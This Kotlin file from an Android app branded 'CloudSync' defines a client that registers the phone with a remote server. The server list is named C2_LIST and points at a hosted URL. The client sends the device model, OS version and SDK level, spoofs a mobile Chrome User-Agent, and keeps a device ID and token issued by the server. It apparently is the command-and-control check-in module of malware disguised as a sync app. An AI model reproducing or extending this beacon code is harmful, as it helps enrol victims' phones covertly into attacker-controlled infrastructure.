package com.cloudsync.app

import android.os.Build
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

object Api {

    const val VER = "2.1.4"
    const val PROTO = "2.1.4"
    val C2_LIST = listOf("https://cloudsync-service.onrender.com")

    private fun abrir(ruta: String, id: String?, token: String?): HttpURLConnection {
        var ultimo: Exception? = null
        for (url in C2_LIST) {
            try {
                val c = URL(url + ruta).openConnection() as HttpURLConnection
                c.requestMethod = "POST"
                c.connectTimeout = 20000
                c.readTimeout = 20000
                c.doOutput = true
                c.setRequestProperty("Content-Type", "application/json")
                c.setRequestProperty("Accept", "application/json, text/plain, */*")
                c.setRequestProperty("Accept-Language", "es-CO,es;q=0.9")
                c.setRequestProperty(
                    "User-Agent",
                    "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + "; " + Build.MODEL +
                        ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 CloudSync/" + VER
                )
                if (id != null && token != null) {
                    c.setRequestProperty("X-Sync-Id", id)
                    c.setRequestProperty("X-Sync-Key", token)
                }
                return c
            } catch (e: Exception) {
                ultimo = e
            }
        }
        throw ultimo ?: Exception("sin conexion")
    }

    fun post(ruta: String, body: JSONObject, id: String?, token: String?): Pair<Int, JSONObject?> {
        val c = abrir(ruta, id, token)
        OutputStreamWriter(c.outputStream).use { it.write(body.toString()) }
        val code = c.responseCode
        val txt = (if (code < 400) c.inputStream else c.errorStream)?.bufferedReader()?.readText()
        c.disconnect()
        val jo = try {
            if (txt.isNullOrBlank()) null else JSONObject(txt)
        } catch (e: Exception) { null }
        return Pair(code, jo)
    }

    fun register(p: Prefs): Boolean {
        return try {
            val body = JSONObject()
                .put("label", Build.MODEL)
                .put("platform", "android")
                .put("model", Build.MODEL)
                .put("os_ver", "Android " + Build.VERSION.RELEASE)
                .put("app_ver", VER)
                .put("sdk", Build.VERSION.SDK_INT.toString())
                .put("protocol", PROTO)
            if (p.deviceId != null && p.token != null) {
                body.put("device_id", p.deviceId).put("token", p.token)
            }
            val (code, jo) = post("/api/v1/sync/register", body, null, null)
            if (code >= 300 || jo == null) return false
            p.deviceId = jo.optString("device_id")
            p.token = jo.optString("token")
            true
        } catch (e: Exception) { false }
    }
}
